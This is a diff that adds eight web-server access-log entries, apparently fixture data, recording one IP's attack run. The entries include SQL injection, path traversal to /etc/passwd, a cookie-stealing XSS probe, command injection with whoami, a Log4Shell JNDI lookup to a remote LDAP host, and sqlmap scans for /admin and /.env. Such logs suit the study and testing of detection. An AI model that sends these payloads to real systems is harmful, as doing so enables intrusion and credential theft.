@@ -1,0 +1,8 @@
+192.0.2.88 - - [10/Oct/2026:11:30:01 +0000] "GET /products?id=12%27%20OR%20%271%27=%271 HTTP/1.1" 500 1159 "-" "Mozilla/5.0"
+192.0.2.88 - - [10/Oct/2026:11:30:04 +0000] "GET /products?id=1%20UNION%20SELECT%20username,password%20FROM%20users HTTP/1.1" 200 2210 "-" "Mozilla/5.0"
+192.0.2.88 - - [10/Oct/2026:11:30:09 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 200 3622 "-" "curl/8.5.0"
+192.0.2.88 - - [10/Oct/2026:11:30:14 +0000] "GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1" 200 840 "-" "Mozilla/5.0"
+192.0.2.88 - - [10/Oct/2026:11:30:19 +0000] "GET /ping?host=8.8.8.8;whoami HTTP/1.1" 200 96 "-" "Mozilla/5.0"
+192.0.2.88 - - [10/Oct/2026:11:30:24 +0000] "GET / HTTP/1.1" 200 5120 "-" "${jndi:ldap://192.0.2.88:1389/Exploit}"
+192.0.2.88 - - [10/Oct/2026:11:30:29 +0000] "GET /admin HTTP/1.1" 404 3800 "-" "sqlmap/1.8.4#stable (https://sqlmap.org)"
+192.0.2.88 - - [10/Oct/2026:11:30:31 +0000] "GET /.env HTTP/1.1" 404 420 "-" "sqlmap/1.8.4#stable (https://sqlmap.org)"
